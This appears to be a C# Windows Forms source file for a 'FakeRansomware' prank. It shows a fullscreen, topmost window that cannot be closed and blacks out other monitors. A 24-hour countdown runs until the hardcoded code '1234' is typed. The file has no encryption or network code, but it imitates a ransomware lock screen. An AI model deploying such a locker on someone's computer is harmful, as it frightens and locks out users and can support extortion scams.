using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FakeRansomware
{
    public partial class kthxbai : Form
    {
        bool stopCountdown = false;

        public kthxbai()
        {
            InitializeComponent();
        }
        async Task<int> startCountdown(DateTime expire)
        {
            while (!stopCountdown)
            {
                TimeSpan ts = (expire - DateTime.Now);
                this.Invoke((MethodInvoker)delegate
                {
                    lblCounter.Text = ts.ToString(@"hh\:mm\:ss");
                });
                Thread.Sleep(1000);
            }
            return 0;
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (stopCountdown == false)
            {
                e.Cancel = true;
                base.OnClosing(e);
            }
        }
        private async void Form1_Load(object sender, EventArgs e)
        {
            // Maximize main form
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;

            Screen startupScreen = Screen.FromControl(this);

            // For each additional screen, black it out
            foreach (var screen in Screen.AllScreens)
            {
                if (screen != startupScreen)
                {
                    Form f = new BlackWindow(screen);
                    f.Show();
                }
            }

            // Start timer
            DateTime appStarted = DateTime.Now;
            await Task.Run(() => startCountdown(appStarted.AddDays(1)));
            this.Close();
        }

        private void TextBox1_TextChanged(object sender, EventArgs e)
        {
            if (tboxCode.Text == "1234")
            {
                tboxCode.BackColor = Color.Green;
                stopCountdown = true;
            }
        }
    }

}
